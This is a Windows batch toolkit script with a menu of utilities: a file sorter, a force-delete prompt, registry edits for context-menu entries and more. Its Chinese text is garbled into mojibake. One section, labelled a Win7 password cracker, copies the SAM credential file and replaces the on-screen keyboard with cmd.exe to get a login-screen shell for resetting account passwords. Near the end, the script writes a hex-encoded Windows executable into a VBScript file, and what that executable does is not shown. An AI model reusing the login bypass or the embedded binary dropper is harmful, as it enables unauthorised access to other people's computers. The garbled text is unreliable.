        for /f "tokens=3" %%z in ('dir /-c %%d:\') do set freesize=%%z
        set /a freesize=!freesize:~0,-3!/1049>nul
        set freesize=         !freesize!
        set freesize=!freesize:~-9!
        for /f "tokens=3*" %%v in ('vol %%d:') do set volume=%%w
        set volume=                    !volume!
        set volume=!volume:~-20!
        echo        �U           %%d: !volume!     !freesize!            �U
    )
)
echo        �^�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�a
echo             �������������һ��...
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����




:mark23
cls
title Win7�����ƽ⹤��
 @echo off
echo ��ӭʹ��Win7�����ƽ⹤��
echo ��ȷ������WinPE����
set /p pf=����������ϵͳ�̷���
:mark23.1
cls
echo ��Ҫ��ʲô��
echo a.�ƽ����� b.�ָ����� c.�˳�
set /p cz=����ѡ��
if %cz%==a goto mark23.2
if %cz%==b goto mark23.3
if %cz%==c exit
goto mark23.1

:mark23.2
cls
attrib -S %pf%:\WINDOWS\System32\Config\SAM
copy %pf%:\WINDOWS\System32\Config\SAM %pf%:\SAM
move %pf%:\WINDOWS\System32\osk.exe %pf%:\osk.exe
copy %pf%:\WINDOWS\System32\cmd.exe %pf%:\WINDOWS\System32\osk.exe
cls
echo ���Win7�����������ɷ����е���Ļ���̣���net user [�û���] [����]��������
pause
%pf%:\WINDOWS\System32\shutdown.exe /r /t 0

:mark23.3
cls
echo ��ȷ���Ѿ��ر���Ļ���̹���
pause
move %pf%:\SAM %pf%:\WINDOWS\System32\Config\SAM
attrib +S %pf%:\WINDOWS\System32\Config\SAM
move %pf%:\osk.exe %pf%:\WINDOWS\System32\osk.exe
cls
echo �ɹ�
pause
%pf%:\WINDOWS\System32\shutdown.exe /s /t 0

echo             �������������һ��...
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����








:mark24

title �ļ�����������-test
cls
echo                               
echo           �q�������������������������������������������������������r
echo           ��                                                        ��
echo           ��        �������ܶԵ�ǰĿ¼����������Ŀ¼�µ��ļ�����    ��
echo           ��                                                        ��
echo           ��    ���࣬����Ч�����£�                                ��
echo           ��                                                        ��
echo           ��        �ڵ�ǰĿ¼������Ŀ¼�£��Ը��ļ�������ļ�      ��
echo           ��                                                        ��
echo           ��    ������Ϊ�ļ��������ڸ��ļ�����Ŀ¼�½�������        ��
echo           ��                                                        ��
echo           ��    exe�ļ���rar�ļ� ֮����ļ��У���ͬ���͵��ļ���     ��
echo           ��                                                        ��
echo           ��    ������Ӧ���ļ����£��Ա���ԭ�����ļ��нṹ���䡣    ��
echo           ��                                                        ��
echo           ��        ����Ժ����������ļ����ٴ����б��ű�ʱ����      ��
echo           ��                                                        ��
echo           ��    ��λ���Ѿ����ڶ�Ӧ���ļ��У�����������ļ�����      ��
echo           ��                                                        ��
echo           ��    �ڸ��ļ����£��������ڶ�Ӧ���ļ��У����½��ļ�      ��
echo           ��                                                        ��
echo           ��    ���Ա�����ļ���                                    ��
echo           ��                                                        ��
echo           �t���������������������������������������������������������s
echo                                              �������������һ��...
pause>nul

:mark24.1
cls
title �ļ�����������-��������
echo.
echo.
echo.
echo.
echo         ���Ҫ������ļ�������������(ֱ�ӻس�������ǰĿ¼)��
echo.
set "source_path=%cd%"
set /p source_path=                 
echo.
echo          �����뱣��λ�þ���·��(ֱ�ӻس���������Դ�ļ�����)��
set destination_path=
set /p destination_path=                 
echo.
echo             ������Ҫ������ļ����ͣ���������Կո�ָ�
echo.
echo                (�磺rar exe��ֱ�ӻس���������������)��
echo.
set type_included=
set /p type_included=                 

if exist "%source_path:"=%" (
    set "source_path=%source_path:"=%\"
) else goto mark24.1
set "source_dir=%source_path:"=%"

rem ======= ����Դ�ļ��еĲ��� =======
set source_layers=0
set "source_dir_tmp=%source_dir%"
:mark24.2
set "source_dir_tmp=%source_dir_tmp:*\=%"
set /a source_layers+=1
if not "%source_dir_tmp%"=="" goto mark24.2

if defined destination_path set destination=yes

for /f "delims=" %%i in ('dir /a-d /b /s /oe "%source_path%"') do (
    set "nx_name=%%~nxi"
    call :mark24.3 "%%~xi" "%%~dpi"
    set file_type=%%~xi
    set "source_path=%%~dpi"
)
goto :eof

rem ======= ���ļ����ʹ����ļ��� =======
:mark24.3
set include=
for %%i in (%type_included%) do if /i "%1"==".%%i" set include=yes
if defined type_included if not defined include goto :eof
set types=%1
if %types%=="" goto :eof
set types=%types:~2,-1%

if not defined destination set destination_path=%2

set "destination_path=%destination_path:"=%"
if not "%destination_path:~-1%"=="\" set "destination_path=%destination_path%\"

rem ======= ��ȡ�ļ���Դ�ļ��е����λ�� =======
set source_sub_path=%2
set "source_sub_path=%source_sub_path:"=%"
set num=0
:mark24.4
set "source_sub_path=%source_sub_path:*\=%"
set /a num+=1
if not %num% equ %source_layers% goto mark24.4


rem ======= ��ȡ�ļ�����·����Ŀ¼�� =======
for /f "delims=" %%i in ("%destination_path:~0,-1%") do set "source_name=%%~nxi"

:: ͨ���Ա��ļ����������ļ�����·����Ŀ¼�����ж���Щ�ļ��Ѿ������

if "%source_name%"=="%types%�ļ�" goto :eof

:: �ж��ļ�����λ���Ƿ����˱仯
if %2=="%source_path%" (set chang_dir=) else set chang_dir=yes&set file_type=

:: �ж�Ҫ������ļ��ǲ����������ļ�����
if "%destination_path%%nx_name%"=="%~f0" (set file_self=yes) else set file_self=

:: �ж��ļ������Ƿ����˱仯

if /i "%1"=="%file_type%" (set same_type=yes) else set same_type=
if not defined destination set source_sub_path=

if not defined chang_dir (
    if not defined file_self if not defined same_type md "%destination_path%%source_sub_path%%types%�ļ�" 2>nul
) else (
    if not defined file_self if not defined same_type md "%destination_path%%source_sub_path%%types%�ļ�" 2>nul
)
if not defined file_self move /-y %2"%nx_name%" "%destination_path%%source_sub_path%%types%�ļ�"
goto :eof

:: source_path��Դ�ļ���·��
:: source_layers��Դ�ļ��еĲ���
:: destination_path��Ŀ���ļ���·��
:: include��Ҫ�ų����ļ�����
:: destination����־�����������ж��Ƿ�ָ��Ŀ���ļ���·��
:: nx_name��Դ�ļ����ļ����ͺ�׺�����
:: file_type��Դ�ļ�������
:: source_sub_path��Դ�ļ������Դ�ļ��е�·��
:: source_path_tmp��Դ�ļ���·������ʱ����
:: source_name��Դ�ļ���
:: source_name_tmp��Դ�ļ�����ʱ����
:: chang_dir���ж��ļ����Ƿ����仯�ı�־
:: same_type���ж��ļ������Ƿ���ͬ�ı���
:: file_self���ж��ǲ����������ļ�����ı���
:: included��Ҫ������ļ�����
:: type_included�������Ƿ���ǰ�ļ����͵ı�־
exit                    ::��ֹ�����ּ�����








:mark25
@echo off
cls
title ǿɾ
color bc
mode con cols=26 lines=8
set/p l=(���ļ��ϵ������ڻس�ɾ��)                                          
del %l% /q /f&cls
@echo ������˳� &pause>nul 2>nul
exit                    ::��ֹ�����ּ�����







:mark26
@echo off
TITLE  Windows �Ҽ���չ    
:startfjcyz
MODE con: COLS=80 LINES=31
color 4f
cls
echo                       �q�������������������������������r
echo   �q��������������������        ��  ��  ��  ��        ���������������������r
echo   ��                  �t�������������������������������s                  ��
echo   ��                                                                      ��
echo   ��  1���Ҽ��������                            10���Ҽ����ע��         ��
echo   ��                                                                      ��
echo   ��  2���Ҽ���ӹػ�                            11���Ҽ���ӻ�ɾ������   ��
echo   ��                                                                      ��
echo   ��  3�����Ӹ����Ƶ�...�ƶ���...����            12���Ҽ���ӿ������     ��
echo   ��                                                                      ��
echo   ��  4���Ҽ���Ӽ��±�����                    13���Ҽ���ӷ���         ��
echo   ��                                                                      ��
echo   ��  5���������վ������                        14���Ҽ�������         ��
echo   ��                                                                      ��
echo   ��  6���Ҽ���Ӵ�MS-DOS                      15���Ҽ�����豸������   ��
echo   ��                                                                      ��
echo   ��  7���Ҽ������ʾ/�����ļ�+��չ�� +                                   ��
echo   ��                                                                      ��
echo   ��  8���Ҽ������ջ���վ                                               ��
echo   ��                                                                      ��
echo   ��  9���Ҽ����� +                                                       ��
echo   ��                                                                      ��
echo   ��                                                                      ��
echo   ��                              e���˳�                                 ��
echo   ��                                                                      ��
echo   ��                                                                      ��
echo   ��       ��ҳ���� + ���⣬�����ֺ��a����Ϊȡ����������1a��2a�ȡ�       ��
echo   �t�����������������������������������������������������������������������s
set /p list0=  ������ѡ��:
if "%list0%"=="1" goto list1_1
if "%list0%"=="1a" goto list1_1a
if "%list0%"=="2" goto list2_2
if "%list0%"=="2a" goto list2_2a
if "%list0%"=="3" goto list3_3
if "%list0%"=="3a" goto list3_3a
if "%list0%"=="4" goto list4_4
if "%list0%"=="4a" goto list4_4a
if "%list0%"=="5" goto list5_5
if "%list0%"=="5a" goto list5_5a
if "%list0%"=="6" goto list6_6
if "%list0%"=="6a" goto list6_6a
if "%list0%"=="7" goto list7_7
if "%list0%"=="7a" goto startfjcyz
if "%list0%"=="8" goto list8_8
if "%list0%"=="8a" goto list8_8a
if "%list0%"=="9" goto list9_9
if "%list0%"=="9a" goto startfjcyz
if "%list0%"=="10" goto list10_10
if "%list0%"=="10a" goto list10_10a
if "%list0%"=="11" goto list11_11
if "%list0%"=="11a" goto list11_11a
if "%list0%"=="12" goto list12_12
if "%list0%"=="12a" goto list12_12a
if "%list0%"=="13" goto list13_13
if "%list0%"=="13a" goto list13_13a
if "%list0%"=="14" goto list14_14
if "%list0%"=="14a" goto list14_14a
if "%list0%"=="15" goto list15_15
if "%list0%"=="15a" goto list15_15a
if "%list0%"=="0" goto startfjcyz
if "%list0%"=="e" goto exit
goto startfjcyz
rem �������������������������������
rem �������������������������������
rem �������������������������������
goto 0
:list1_1
MODE con: COLS=50 LINES=15
cls
echo.
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\restart]>>SHOWALL.reg
ECHO @="���������(&Q)">>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\restart\command]>>SHOWALL.reg
ECHO @="Shutdown.exe -r -t 0">>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo                �Ҽ��˵����������!
echo.
echo                  �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 0
:list1_1a
MODE con: COLS=50 LINES=15
cls
reg delete "HKLM\SOFTWARE\Classes\Folder\shell\restart" /f
cls
echo.
echo                 �Ҽ�������ɾ��!
echo.
echo                  �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 2
:list2_2
MODE con: COLS=50 LINES=15
cls
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\close]>>SHOWALL.reg
ECHO @="�رռ����(&G)">>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\close\command]>>SHOWALL.reg
ECHO @="Shutdown.exe -s -t 0">>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo                �Ҽ��˵�����ӹػ�!
echo.
echo                  �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 2
:list2_2a
MODE con: COLS=50 LINES=15
cls
reg delete "HKLM\SOFTWARE\Classes\Folder\shell\close" /f
cls
echo.
echo                 �Ҽ��ػ���ɾ��!
echo.
echo                  �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 3
:list3_3
MODE con: COLS=50 LINES=15
cls
echo.
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AllFilesystemObjects\shellex]>>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AllFilesystemObjects\shellex\ContextMenuHandlers]>>SHOWALL.reg 

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AllFilesystemObjects\shellex\ContextMenuHandlers\Copy To]>>SHOWALL.reg 
ECHO @="{C2FBB630-2971-11D1-A18C-00C04FD75D13}">>SHOWALL.reg 

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AllFilesystemObjects\shellex\ContextMenuHandlers\Move To]>>SHOWALL.reg 
ECHO @="{C2FBB631-2971-11D1-A18C-00C04FD75D13}">>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo                   ��ӳɹ�!
echo.
echo                 �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 3
:list3_3a
MODE con: COLS=50 LINES=15
cls
reg delete "HKLM\SOFTWARE\Classes\AllFilesystemObjects\shellex\ContextMenuHandlers\Copy To" /f
reg delete "HKLM\SOFTWARE\Classes\AllFilesystemObjects\shellex\ContextMenuHandlers\Move To" /f
cls
echo.
echo                   ɾ���ɹ�!
echo.
echo                 �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 4
:list4_4
MODE con: COLS=50 LINES=15
cls
echo.
ECHO Windows Registry Editor Version 5.00>>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\*\shell\��"���±�"��]>>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\*\shell\��"���±�"��\command]>>SHOWALL.reg
ECHO @="notepad.exe %%1">>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo                 �ɹ�������±�!
echo.
echo                  �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 4
:list4_4a
MODE con: COLS=50 LINES=15
cls
reg delete "HKCR\*\shell" /f
cls
echo.
echo                ���±�����ɾ��!
echo.
echo                  �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 5
:list5_5
MODE con: COLS=50 LINES=15
cls
echo.
ECHO Windows Registry Editor Version 5.00>>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\ShellFolder]>>SHOWALL.reg
ECHO "Attributes"=hex:50,01,00,20>>SHOWALL.reg
ECHO "CallForAttributes"=dword:00000000>>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo                 ������������!
echo.
echo                 �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 5
:list5_5a
MODE con: COLS=50 LINES=15
cls
echo.
ECHO Windows Registry Editor Version 5.00>>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\ShellFolder]>>SHOWALL.reg
ECHO "Attributes"=hex:40,01,00,20>>SHOWALL.reg
ECHO "CallForAttributes"=dword:00000040>>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo                  ��ȡ��������!
echo.
echo                  �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 6
:list6_6
MODE con: COLS=50 LINES=15
cls
echo.
reg add "HKCR\*\shell\��ms-dos" /ve /d ��ms-dos /f
reg add "HKCR\*\shell\��ms-dos\command"  /ve /d "cmd.exe /k cd %%1"  /f
reg add "HKCR\Folder\shell\��ms-dos" /ve /d ��ms-dos /f
reg add "HKCR\Folder\shell\��ms-dos\command" /ve /d "cmd.exe /k cd %%1" /f
cls
echo.
echo                 ����Ӵ�MS-DOS!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 6
:list6_6a
MODE con: COLS=50 LINES=15
cls
reg delete "HKCR\*\shell\��ms-dos" /f
reg delete "HKCR\Folder\shell\��ms-dos" /f
cls
echo.
echo                   MS-DOS��ɾ��!
echo.
echo                   �����������!
pause>nul
goto startfjcyz
rem �������������������������������
goto 7
:list7_7
MODE con: COLS=50 LINES=19
color 5f
cls
echo         �q�������������������������������r
echo   �q������     ��ʾ/�����ļ�+��չ��     �������r
echo   ��    �t�������������������������������s    ��
echo   ��                                          ��
echo   ��  1���Ҽ������ʾ/�����ļ�+��չ��         ��
echo   ��                                          ��
echo   ��  2���Ҽ������ʾ/�����ļ�                ��
echo   ��                                          ��
echo   ��  3���Ҽ������ʾ/�����ļ���չ��          ��
echo   ��                                          ��
echo   ��  0�������ϲ�˵�                         ��
echo   ��                                          ��
echo   ��  e���˳�                                 ��
echo   ��                                          ��
echo   ��  ��ҳ�����ֺ��a��Ϊȡ������,��1a��2a��  ��
echo   �t�������������������������������������������s
set /p list1=  ������ѡ��:
if "%list1%"=="1" goto list1_1
if "%list1%"=="1a" goto list1_1a
if "%list1%"=="2" goto list1_2
if "%list1%"=="2a" goto list1_2a
if "%list1%"=="3" goto list1_3
if "%list1%"=="3a" goto list1_3a
if "%list1%"=="0" goto startfjcyz
if "%list1%"=="e" goto exit
goto 7
rem �������������������������������
rem �������������������������������
rem �������������������������������
goto 7
:list1_1
MODE con: COLS=50 LINES=15
color 4f
cls
del /s /q %windir%\SuperHidden.vbs
cls
ECHO REGEDIT4>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Directory\Background\shellex\ContextMenuHandlers\SuperHidden]>>SHOWALL.reg
ECHO @="{00000000-0000-0000-0000-000000000012}">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\InProcServer32]>>SHOWALL.reg
ECHO @=hex(2):25,53,79,73,74,65,6d,52,6f,6f,74,25,5c,73,79,73,74,65,6d,33,32,5c,73,\>>SHOWALL.reg
ECHO   68,64,6f,63,76,77,2e,64,6c,6c,00>>SHOWALL.reg
ECHO "ThreadingModel"="Apartment">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\Instance]>>SHOWALL.reg
ECHO "CLSID"="{3f454f0e-42ae-4d7c-8ea3-328250d6e272}">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag]>>SHOWALL.reg
ECHO "method"="ShellExecute">>SHOWALL.reg
ECHO "Param1"="SuperHidden.vbs">>SHOWALL.reg
ECHO "command"="��ʾ/����ϵͳ�ļ�+��չ��">>SHOWALL.reg
ECHO "CLSID"="{13709620-C279-11CE-A49E-444553540000}">>SHOWALL.reg

ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>SHOWALL.reg
ECHO "ShowSuperHidden"=dword:00000000>>SHOWALL.reg
ECHO "Hidden"=dword:00000002>>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg


ECHO 'Show/Hide System Files>>%windir%\SuperHidden.vbs 
echo.>>%windir%\SuperHidden.vbs
ECHO Dim WSHShell>>%windir%\SuperHidden.vbs
ECHO Set WSHShell = WScript.CreateObject("WScript.Shell")>>%windir%\SuperHidden.vbs
ECHO sTitle1 = "SSH=0">>%windir%\SuperHidden.vbs
ECHO sTitle2 = "SSH=1">>%windir%\SuperHidden.vbs
echo.>>%windir%\SuperHidden.vbs
ECHO if WSHShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden") = 1 then>>%windir%\SuperHidden.vbs
echo.>>%windir%\SuperHidden.vbs
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "0", "REG_DWORD">>%windir%\SuperHidden.vbs
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "2", "REG_DWORD">>%windir%\SuperHidden.vbs
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1", "REG_DWORD">>%windir%\SuperHidden.vbs
ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "��ʾϵͳ�ļ�+��չ��", "REG_SZ">>%windir%\SuperHidden.vbs
ECHO WSHShell.SendKeys "{F5}+{F10}e">>%windir%\SuperHidden.vbs
ECHO 'WSHShell.Popup "Poof, they're gone!", 1, sTitle1, vbInformation>>%windir%\SuperHidden.vbs
echo.>>%windir%\SuperHidden.vbs
ECHO else>>%windir%\SuperHidden.vbs
echo.>>%windir%\SuperHidden.vbs
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "1", "REG_DWORD">>%windir%\SuperHidden.vbs
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "1", "REG_DWORD">>%windir%\SuperHidden.vbs
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "0", "REG_DWORD">>%windir%\SuperHidden.vbs
ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "����ϵͳ�ļ�+��չ��", "REG_SZ">>%windir%\SuperHidden.vbs
ECHO WSHShell.SendKeys "{F5}+{F10}e">>%windir%\SuperHidden.vbs
ECHO 'WSHShell.Popup "Here they are!", 1, sTitle2, vbInformation>>%windir%\SuperHidden.vbs
echo.>>%windir%\SuperHidden.vbs
ECHO end if>>%windir%\SuperHidden.vbs
echo.>>%windir%\SuperHidden.vbs
ECHO Set WSHShell = Nothing>>%windir%\SuperHidden.vbs
ECHO WScript.Quit(0)>>%windir%\SuperHidden.vbs
cls
echo.
echo.
echo.
echo.
echo.
echo            �ɹ������ʾ/�����ļ�����չ��!
echo.
echo.
echo                   �����������!
pause>nul
goto list7_7
rem �������������������������������
goto 7
:list1_1a
MODE con: COLS=50 LINES=15
color 1f
cls
del /s /q %windir%\SuperHidden.vbs
cls
reg delete "HKCR\Directory\Background\shellex\ContextMenuHandlers\SuperHidden" /f
reg delete "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\InProcServer32" /f
reg delete "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance" /f
reg delete "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag" /f

ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>SHOWALL.reg
ECHO "ShowSuperHidden"=dword:00000001>>SHOWALL.reg
ECHO "Hidden"=dword:00000001>>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg
cls
echo.
echo.
echo.
echo.
echo.
echo            ��ʾ/�����ļ�����չ��ɾ���ɹ�!
echo.
echo.
echo                   �����������!
pause>nul
goto list7_7
rem �������������������������������
goto 7
:list1_2
MODE con: COLS=50 LINES=15
color 4f
cls
del /s /q %windir%\SuperHidden.vbs
cls
ECHO REGEDIT4>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\Directory\Background\shellex\ContextMenuHandlers\SuperHidden]>>SHOWALL.reg
ECHO @="{00000000-0000-0000-0000-000000000012}">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\InProcServer32]>>SHOWALL.reg
ECHO @=hex(2):25,53,79,73,74,65,6d,52,6f,6f,74,25,5c,73,79,73,74,65,6d,33,32,5c,73,\>>SHOWALL.reg
ECHO   68,64,6f,63,76,77,2e,64,6c,6c,00>>SHOWALL.reg
ECHO "ThreadingModel"="Apartment">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\Instance]>>SHOWALL.reg
ECHO "CLSID"="{3f454f0e-42ae-4d7c-8ea3-328250d6e272}">>SHOWALL.reg

ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag]>>SHOWALL.reg
ECHO "method"="ShellExecute">>SHOWALL.reg
ECHO "Param1"="SuperHidden.vbs">>SHOWALL.reg
ECHO "command"="��ʾ/����ϵͳ�ļ�">>SHOWALL.reg
ECHO "CLSID"="{13709620-C279-11CE-A49E-444553540000}">>SHOWALL.reg

ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>SHOWALL.reg
ECHO "ShowSuperHidden"=dword:00000000>>SHOWALL.reg
ECHO "Hidden"=dword:00000002>>SHOWALL.reg

REGEDIT /S SHOWALL.reg

DEL /F /Q SHOWALL.reg


ECHO 'Show/Hide System Files>>%windir%\SuperHidden.vbs 
echo.>>%windir%\SuperHidden.vbs 
ECHO Dim WSHShell>>%windir%\SuperHidden.vbs 
ECHO Set WSHShell = WScript.CreateObject("WScript.Shell")>>%windir%\SuperHidden.vbs 
ECHO sTitle1 = "SSH=0">>%windir%\SuperHidden.vbs 
ECHO sTitle2 = "SSH=1">>%windir%\SuperHidden.vbs 
echo.>>C:\WINDOWS\SuperHidden.vbs 
ECHO if WSHShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden") = 1 then>>%windir%\SuperHidden.vbs 
echo.>>%windir%\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "0", "REG_DWORD">>%windir%\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "2", "REG_DWORD">>%windir%\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "��ʾϵͳ�ļ�", "REG_SZ">>%windir%\SuperHidden.vbs 
ECHO WSHShell.SendKeys "{F5}+{F10}e">>%windir%\SuperHidden.vbs 
ECHO 'WSHShell.Popup "Poof, they're gone!", 1, sTitle1, vbInformation>>%windir%\SuperHidden.vbs 
echo.>>%windir%\SuperHidden.vbs 
ECHO else>>%windir%\SuperHidden.vbs 
echo.>>%windir%\SuperHidden.vbs
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "1", "REG_DWORD">>%windir%\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "1", "REG_DWORD">>%windir%\SuperHidden.vbs 
ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "����ϵͳ�ļ�", "REG_SZ">>%windir%\SuperHidden.vbs 
ECHO WSHShell.SendKeys "{F5}+{F10}e">>%windir%\SuperHidden.vbs 
ECHO 'WSHShell.Popup "Here they are!", 1, sTitle2, vbInformation>>%windir%\SuperHidden.vbs 
echo.>>%windir%\SuperHidden.vbs 
ECHO end if>>%windir%\SuperHidden.vbs 
echo.>>%windir%\SuperHidden.vbs 
ECHO Set WSHShell = Nothing>>%windir%\SuperHidden.vbs 
ECHO WScript.Quit(0)>>%windir%\SuperHidden.vbs 
cls
echo.���������У����Ժ�...
@echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
@echo +"8F8AF9DBCBEB9788CBEB9788CBEB978848F79988CAEB9788A2F49E88CAEB978822F49A88CAEB978852696368CBEB97880000000000000000504500004C0103001A5CB4450000000000000000E0000F010B010600002000000020000000000000D811000000100000003000000000400000100000001000000400000001000000"_>>debug.vbs
@echo +"0400000000000000005000000010000027180100020000000000100000100000000010000010000000000000100000000000000000000000242600002800000000400000F80800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000280200002000000000100000B40000000000000000000000000000000000000000000000000000002E74657874000000B8190000001000000020000000100000000000000000000000000000200000602E64617461000000EC090000003000000010000000300000000000000000000000000000400000C0"_>>debug.vbs
@echo +"2E72737263000000F808000000400000001000000040000000000000000000000000000040000040FC4521411000000000000000000000004D535642564D36302E444C4C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
